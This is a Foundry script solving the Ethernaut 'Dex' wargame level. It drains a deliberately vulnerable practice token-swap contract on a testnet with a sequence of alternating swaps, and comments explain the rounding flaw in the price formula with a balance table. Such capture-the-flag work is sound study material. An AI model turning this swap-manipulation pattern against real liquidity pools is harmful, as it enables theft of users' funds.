// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Dex.sol";

/*
    Solution script for the Ethernaut Level 22: Dex

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in DexScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Dex.s.sol:DexScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Dex.s.sol/11155111
*/

contract DexScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x6E8122699D4C4ADb2d6e470967D767D7dD7BafA4;
    Dex level22 = Dex(0x6E8122699D4C4ADb2d6e470967D767D7dD7BafA4);

    function run() external {
        vm.startBroadcast();

        level22.approve(address(level22), 500);
        address token1 = level22.token1();
        address token2 = level22.token2();

        /*
            Source: https://blog.dixitaditya.com/ethernaut-level-22-dex?source=more_series_bottom_blogs
            
            The vulnerabilitiy is in the Dex contract getSwapPrice which does not account for rounding precision loss.

            ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))
            The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.

            1. Initially Dex has a balance of 100 for both the tokens and the User has a balance of 10 each.
            2. The user makes a token swap from token1 to token2 for 10 tokens. Dex will have 110 token1 and 90 token2 w
            hereas the user will have 0 token1 and 20 token2.
            3. Now, when the user swaps 20 token2 for token1, the formula will return the following:

            Number of token1 tokens returned = (20 * 110)/90 = 24.44

            This value will be rounded off to 24. This means Dex will now have 86 token1, and 110 token2 and our 
            user will have 24 token1 and 0 token2. If this is repeated a few more times, it will produce the values shown in the table below.

            Dex		        User	
            token1	token2	token1	token2
            100	    100	    10	    10
            110	    90	    0	    20
            86	    110	    24	    0
            110	    80	    0	    30
            69	    110	    41	    0
            110	    45	    0	    65
            0	    90	    110	    20
        */

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        console.log("Final token1 balance of Dex is : ", level22.balanceOf(token1, address(level22)));

        vm.stopBroadcast();
    }
}